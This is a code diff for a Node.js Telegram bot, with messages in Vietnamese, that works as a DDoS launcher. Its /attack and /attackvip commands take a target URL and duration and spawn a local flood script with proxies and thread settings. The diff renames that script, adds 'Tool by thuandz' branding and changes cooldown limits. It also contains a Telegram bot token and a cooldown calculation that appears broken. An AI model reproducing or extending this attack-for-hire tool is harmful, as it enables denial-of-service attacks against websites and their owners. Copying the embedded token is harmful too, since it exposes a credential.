@@ -2,7 +2,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const { spawn } = require('child_process');
 const path = require('path');
 
-const token = '8009374577:8395956317:AAHu7lAbS5Qi56EUD11bJRDi8oE-1jCpoCw';
+const token = '8395956317:AAHu7lAbS5Qi56EUD11bJRDi8oE-1jCpoCw';
 const bot = new TelegramBot(token, { polling: true });
 
 let ADMIN_IDS = [7818408538];
@@ -31,7 +31,7 @@ bot.onText(/\/attack (https?:\/\/[^\s]+) (\d+)/, (msg, match) => {
 
     const lastTime = lastUserAttackTime[userId] || 0;
     if (now - lastTime < USER_COOLDOWN) {
-      const waitSec = Math.ceil((USER_COOLDOWN - (now - lastTime)) / 1000);
+      const waitSec = Math.ceil((USER_COOLDOWN - (now - lastTime)) / 150);
       bot.sendMessage(chatId, `⏳ Vui long đoi ${waitSec} giay truoc khi tiep tuc.`);
       return;
     }
@@ -43,9 +43,9 @@ bot.onText(/\/attack (https?:\/\/[^\s]+) (\d+)/, (msg, match) => {
   const thread = '9';
   const proxy = '2.txt';
   const method = 'flood';
-  const scriptPath = path.join(__dirname, 'fld.js');
+  const scriptPath = path.join(__dirname, 'c.js');
 
-  bot.sendMessage(chatId, `🚀 Bat đau attack vao ${url} trong ${duration} giay!`);
+  bot.sendMessage(chatId, `🚀Tool by thuandz Bat đau attack vao ${url} trong ${duration} giay!`);
 
   const proc = spawn('node', [scriptPath, url, duration, rate, thread, proxy]);
 
@@ -96,11 +96,11 @@ bot.onText(/\/attackvip (https?:\/\/[^\s]+) (\d+) (flood|bypass)/, (msg, match) 
   });
 });
 
-// ======== /nu - Huong dan ========
-bot.onText(/\/nu/, (msg) => {
+// ======== /start - Huong dan ========
+bot.onText(/\/start/, (msg) => {
   bot.sendMessage(msg.chat.id, `👋 Xin chao ${msg.from.first_name}!
 Cac lenh co san:
-/attack <url> <thoi gian> - (Thanh vien, toi đa 200s, moi 5 phut)
+/attack <url> <thoi gian> - (Thanh vien, toi đa 90s, moi 2p30s)
 /attackvip <url> <thoi gian> <flood|bypass> - (Chi admin)
 /add <user_id> - Them admin moi (chi admin)
 `);
@@ -125,3 +125,4 @@ bot.onText(/\/add (\d+)/, (msg, match) => {
   ADMIN_IDS.push(newAdminId);
   bot.sendMessage(chatId, `✅ Đa them admin moi voi ID: ${newAdminId}`);
 });
+
